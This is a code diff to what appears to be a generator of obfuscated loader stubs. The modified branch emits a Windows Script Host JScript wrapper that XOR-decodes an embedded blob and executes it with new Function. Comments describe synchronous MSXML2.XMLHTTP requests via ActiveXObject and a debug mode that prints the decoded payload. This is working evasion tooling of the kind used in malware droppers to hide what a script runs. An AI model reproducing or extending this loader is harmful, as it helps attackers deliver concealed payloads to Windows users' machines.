@@ -104,7 +104,14 @@ ${keyDecl('node')}
   }
 
   if (stubStyle === 'wscript') {
+    // NOTE: WScript uses JScript (ES3/ES5). No let/const, no arrow functions, no Promise,
+    // no async/await, no template literals. Use only var, function(){}, string concat.
+    // XHR must be synchronous: xhr.open("GET", url, false) — callbacks never fire (no event loop).
+    // Use ActiveXObject("MSXML2.XMLHTTP"), not new XMLHttpRequest().
+    // Run with: cscript.exe script.js   (shows errors in console)
+    // Debug:    set debugDecode=true below to inspect the decoded string before eval.
     return `(function() {
+  var debugDecode = false; /* set true to print decoded payload instead of running it */
   try {
     /* blob format: ${fmtComment} */
 ${blobDecl('wscript')}
@@ -113,9 +120,16 @@ ${keyDecl('wscript')}
     for (var i = 0; i < encoded.length; i++) {
       decoded += String.fromCharCode(${xorExpr});
     }
-    eval(decoded);
+    if (debugDecode) {
+      WScript.Echo(decoded.substring(0, 500));
+    } else {
+      /* new Function avoids eval() closure-scope issues */
+      (new Function(decoded))();
+    }
   } catch(e) {
-    WScript.Echo("Error: " + e.message);
+    /* Run with cscript.exe to see this in the terminal */
+    try { WScript.StdErr.WriteLine("XOR stub error: " + e.message); } catch(_) {}
+    WScript.Echo("XOR stub error: " + e.message);
   }
 })();`;
   }
